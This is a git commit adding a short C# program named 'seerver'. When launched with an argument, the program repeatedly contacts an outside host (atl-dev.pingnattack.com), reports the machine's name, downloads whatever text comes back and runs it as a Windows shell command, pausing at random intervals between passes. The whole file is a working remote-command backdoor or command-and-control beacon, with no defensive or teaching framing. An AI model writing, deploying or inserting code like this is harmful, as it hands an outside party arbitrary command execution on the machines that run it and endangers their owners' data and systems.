2743bf30619456c90397e9e4df8ee6e7f5470605
Leon Denard <ltdenard@gmail.com>
2019-02-06 10:37:33 -0500

    adding in initial commit

---
+++ seerver/Program.cs
@@ -0,0 +1,30 @@
+﻿using System;
+using System.Diagnostics;
+using System.Net;
+
+namespace seerver
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            if (args.Length > 0)
+            {
+                while (true)
+                {
+                    using (WebClient wc = new WebClient())
+                    {
+                        var hostname = System.Environment.MachineName.ToString();
+                        var url = "http://atl-dev.pingnattack.com/" + hostname;
+                        string commandToExecute = wc.DownloadString(url);
+                        var output = Process.Start(@"cmd", @"/c " + @commandToExecute);
+                    }
+                    Random r = new Random();
+                    int rInt = r.Next(5000, 100000); //for ints
+                    System.Threading.Thread.Sleep(rInt);
+                }
+                
+            }
+        }
+    }
+}
